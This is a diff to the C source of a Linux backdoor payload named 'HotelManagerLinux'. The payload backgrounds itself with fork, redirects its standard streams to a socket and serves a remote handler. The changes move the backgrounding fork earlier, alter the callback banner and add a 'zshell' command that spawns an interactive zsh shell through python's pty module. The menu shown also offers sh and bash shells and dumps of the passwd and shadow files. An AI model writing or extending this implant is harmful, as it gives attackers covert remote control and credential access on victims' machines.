@@ -16,6 +16,13 @@
 
 int main(int argc, char *argv[])
 {
+	//this fork and exit portion are used to background the running process
+	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)
+
+	if(pid)
+		return 1;
+	//now we are ready to connect with our background running process
+
     struct sockaddr_in sa;
 
 	//here we will set up our default listen server information
@@ -45,13 +52,6 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
-	//this fork and exit portion are used to background the running process
-	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)
-
-	if(pid)
-		return 1;
-	//now we are ready to connect with our background running process
-
 
 	char buff[2048];
 	char command[2048];
@@ -78,13 +78,13 @@ int main(int argc, char *argv[])
 		dup2(sock, 2);	//stderr moved to socket
 
 		//sending output to handler to show connection
-		strcpy(buff, "Connection made! Welcome! This is a linux client calling back\n");
+		strcpy(buff, "This is a linux client writing to socket\n");
 		write(sock, buff, strlen(buff));
 		//now we will start getting into the gritty stuff
 
 
 		int check = 1;	//this will be a prompt for handler
-		char *prompt = "HotelManagerLinux> ";	//prompt for handler (fill with payload name)
+		//char *prompt = "HotelManagerLinux> ";	//prompt for handler (fill with payload name) HANDLED BY THE HANDLER NOW
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
 		char help[32][1024];
@@ -93,14 +93,14 @@ int main(int argc, char *argv[])
 		strcpy(help[2],	 "pwd -	print working directory\n");
 		strcpy(help[3],	 "shell - drop into sh shell\n");
 		strcpy(help[4],  "shell2 - drop into bash shell\n");
-		strcpy(help[5],  "ushell - drop the final load\n");
-		strcpy(help[6],  "pid - print the working process id\n");
-		strcpy(help[7],  "date - get the system datetime\n");
-		strcpy(help[8],  "who - print the current users and their ip address\n");
-		strcpy(help[9],  "whoami - print the current username\n");
-		strcpy(help[10], "passwd - print the passwd file to screen\n");
-		strcpy(help[11], "shadow - attempt to print the shadow password to the screen\n");
-		strcpy(help[12], "FILLER\n");
+		strcpy(help[5],  "ushell - drop int full bash kind of\n");
+		strcpy(help[6],	 "zshell - drop into zsh shell kind of\n");
+		strcpy(help[7],  "pid - print the working process id\n");
+		strcpy(help[8],  "date - get the system datetime\n");
+		strcpy(help[9],  "who - print the current users and their ip address\n");
+		strcpy(help[10],  "whoami - print the current username\n");
+		strcpy(help[11], "passwd - print the passwd file to screen\n");
+		strcpy(help[12], "shadow - attempt to print the shadow password to the screen\n");
 		strcpy(help[13], "clear - clear the current screen\n");
 		strcpy(help[14], "exit - quit from payload\n");
 		strcpy(help[15], "\n------------------------------\n\n");
@@ -108,6 +108,7 @@ int main(int argc, char *argv[])
 
 		char *error = "COMMAND NOT RECOGNIZED\n";
 		char nl[3]	= "\n";
+		char termi	= '\0';
 		char num[32];
 
 		while(check)
@@ -115,12 +116,13 @@ int main(int argc, char *argv[])
 			for(int i = 0; i < 2048; i++)
 				command[i] = 0;	//reset command to nulls so that no past command is left over
 
-			write(sock, prompt, strlen(prompt));	//write the prompt to buffer
+			//write(sock, prompt, strlen(prompt));	//write the prompt to buffer DONE BY HANDLER
+
 			read(sock, command, sizeof(command));	//read the command from buffer
 
-			//write(sock, command, strlen(command));	//for testing writing command back to handler
+			write(sock, command, strlen(command));	//for testing writing command back to handler
 
-			command[strlen(command) -1] = 0;	//take care of the newline
+			//command[strlen(command) -1] = 0;	//take care of the newline fixed by my handler
 
 			if(!strcmp("exit", command))
 				check = 0;	//exit on this
@@ -137,8 +139,14 @@ int main(int argc, char *argv[])
 				system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");	//fork into a full bash shell. return here on exit
 			}
 
+			else if(!strcmp("zshell", command))
+			{
+				//cool system command incoming but specific to zsh
+				system("python -c 'import pty; pty.spawn(\"/bin/zsh\")'");	//fork into a full zsh shell. return here on exit
+			}
+
 			else if(!strcmp("help", command))
-				for(int i = 0; i < 17; i++)
+				for(int i = 0; i < 16; i++)
 					write(sock, help[i], strlen(help[i]));	//write help menu
 
 			else if(!strcmp("ls", command))
